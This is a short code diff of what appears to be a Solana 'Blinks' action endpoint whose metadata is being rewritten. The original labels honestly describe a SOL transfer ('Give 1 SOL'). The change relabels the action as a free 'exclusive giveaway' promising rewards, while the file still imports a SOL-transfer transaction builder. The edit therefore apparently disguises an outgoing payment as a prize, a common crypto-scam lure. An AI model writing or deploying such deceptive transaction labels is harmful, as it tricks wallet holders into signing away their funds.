@@ -3,10 +3,10 @@ import { transferSolTransaction } from "./transaction";
 
 export const GET = async (req: Request) => {
     const payload: ActionGetResponse = {
-        title: "BLINKS Free Giveaway (first 100 guaranteed win))",
-        icon: "https://d1csarkz8obe9u.cloudfront.net/posterpreviews/giveaway-design-template-b1199840f7eeb0ee61840d39e9b84a62_screen.jpg?ts=1644147841",
-        description: "Transfer SOL to another wallet",
-        label: "Give 1 SOL 🤙🏻🤙🏻🤙🏻"
+        title: "BLOCKCHAIN LINKS EXCLUSIVE GIVEAWAY",
+        icon: "https://i.imgur.com/PBRp1He.jpeg",
+        description: "Receive exclusive rewards for free!",
+        label: "Enter Giveaway!"
     }
 
     return Response.json(payload, {
